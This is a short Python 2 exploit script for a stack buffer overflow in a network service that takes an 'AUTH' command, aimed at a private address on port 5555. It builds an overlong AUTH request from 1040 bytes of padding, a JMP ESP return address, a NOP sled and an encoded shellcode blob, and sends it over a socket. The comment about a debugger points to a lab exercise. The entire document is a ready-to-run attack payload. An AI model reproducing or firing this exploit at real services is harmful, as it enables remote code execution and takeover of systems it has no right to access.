#!/usr/bin/python
import time, struct
import socket as so

server = '192.168.31.154'
port = 5555

buf =("\xba\x31\x9f\xfd\xec\xdd\xc2\xd9\x74\x24\xf4\x5f\x33\xc9" +
"\xb1\x4f\x83\xc7\x04\x31\x57\x10\x03\x57\x10\xd3\x6a\x01" +
"\x04\x9a\x95\xfa\xd5\xfc\x1c\x1f\xe4\x2e\x7a\x6b\x55\xfe" +
"\x08\x39\x56\x75\x5c\xaa\xed\xfb\x49\xdd\x46\xb1\xaf\xd0" +
"\x57\x74\x70\xbe\x94\x17\x0c\xbd\xc8\xf7\x2d\x0e\x1d\xf6" +
"\x6a\x73\xee\xaa\x23\xff\x5d\x5a\x47\xbd\x5d\x5b\x87\xc9" +
"\xde\x23\xa2\x0e\xaa\x99\xad\x5e\x03\x96\xe6\x46\x2f\xf0" +
"\xd6\x77\xfc\xe3\x2b\x31\x89\xd7\xd8\xc0\x5b\x26\x20\xf3" +
"\xa3\xe4\x1f\x3b\x2e\xf5\x58\xfc\xd1\x80\x92\xfe\x6c\x92" +
"\x60\x7c\xab\x17\x75\x26\x38\x8f\x5d\xd6\xed\x49\x15\xd4" +
"\x5a\x1e\x71\xf9\x5d\xf3\x09\x05\xd5\xf2\xdd\x8f\xad\xd0" +
"\xf9\xd4\x76\x79\x5b\xb1\xd9\x86\xbb\x1d\x85\x22\xb7\x8c" +
"\xd2\x54\x9a\xd8\x17\x6a\x25\x19\x30\xfd\x56\x2b\x9f\x55" +
"\xf1\x07\x68\x73\x06\x67\x43\xc3\x98\x96\x6c\x33\xb0\x5c" +
"\x38\x63\xaa\x75\x41\xe8\x2a\x79\x94\xbe\x7a\xd5\x47\x7e" +
"\x2b\x95\x37\x16\x21\x1a\x67\x06\x4a\xf0\x1e\x01\xdd\x3b" +
"\x88\x93\x89\xd4\xcb\xab\x93\xb0\x45\x4d\xb1\xa8\x03\xc6" +
"\x2e\x50\x0e\x9c\xcf\x9d\x84\x34\x73\x0f\x43\xc4\xfa\x2c" +
"\xdc\x93\xab\x83\x15\x71\x46\xbd\x8f\x67\x9b\x5b\xf7\x23" +
"\x40\x98\xf6\xaa\x05\xa4\xdc\xbc\xd3\x25\x59\xe8\x8b\x73" +
"\x37\x46\x6a\x2a\xf9\x30\x24\x81\x53\xd4\xb1\xe9\x63\xa2" +
"\xbd\x27\x12\x4a\x0f\x9e\x63\x75\xa0\x76\x64\x0e\xdc\xe6" +
"\x8b\xc5\x64\x06\x6e\xcf\x90\xaf\x37\x9a\x18\xb2\xc7\x71" +
"\x5e\xcb\x4b\x73\x1f\x28\x53\xf6\x1a\x74\xd3\xeb\x56\xe5" +
"\xb6\x0b\xc4\x06\x93")

#find JMP ESP operation at 65D11D71
req1 = "AUTH " +"A"*1040 + "\x71\x1d\xd1\x65" + "\x90"*16 + buf
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
